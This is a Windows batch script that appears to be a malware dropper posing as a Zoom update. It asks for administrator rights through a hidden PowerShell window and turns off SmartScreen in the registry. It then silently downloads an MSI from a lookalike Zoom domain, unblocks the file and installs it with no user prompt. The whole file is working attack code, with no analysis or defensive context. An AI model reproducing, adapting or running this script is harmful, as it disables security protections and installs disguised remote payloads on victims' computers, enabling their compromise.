@echo off

:: Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Disable Windows SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1

:: Restart Explorer to apply changes
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe >nul 2>&1

:: Download MSI silently
set "SC_URL=https://zoom-meeting.yourc-invite.live/inc/Windows/zoom/update/ZoomUpdateInstaller.msi"
set "SC_PATH=%TEMP%\WindowsExplorerSupports.msi"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SC_URL%' -OutFile '%SC_PATH%' -UseBasicParsing"

:: Unblock the downloaded files
powershell -WindowStyle Hidden -Command "Unblock-File -Path '%SC_PATH%'"

:: Installs the MSI silently
msiexec /i "%SC_PATH%" /qn /norestart

exit